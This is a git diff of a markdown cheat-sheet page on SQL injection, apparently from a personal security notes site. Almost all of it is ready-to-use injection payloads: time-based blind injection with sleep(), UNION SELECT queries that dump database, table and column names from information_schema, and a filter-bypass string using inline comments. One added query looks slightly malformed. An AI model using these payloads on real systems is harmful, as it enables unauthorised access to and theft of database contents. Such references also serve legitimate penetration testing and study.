@@ -3,6 +3,7 @@ title: 'SQL Injection (SQLI)'
 description: ''
 pubDate: 'Jul 08 2022'
 heroImage: '/placeholder-hero.jpg'
+slug: vuln/sqli
 ---
 
 ```bash
@@ -24,14 +25,20 @@ admin' and if(substr(database(),1,1)='a',sleep(5),1)-- -
 
 admin' and if(substr((select group_concat(schema_name) from information_schema.schemata),1,1)='a',sleep(5),1)-- -
 
-#Database names
+# Get database name
 ' UniOn  Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata
+') union select 1,2,(select group_concat(TABLE_NAME) from information_schema.columns where table_schema like my_db_a)
+
 
 #Tables of a database
 ' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]
 
 #Column names
 ' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
+
+# bad chars
+
+"animals')/**/order/**/by/**/1#"
 
 ```
 
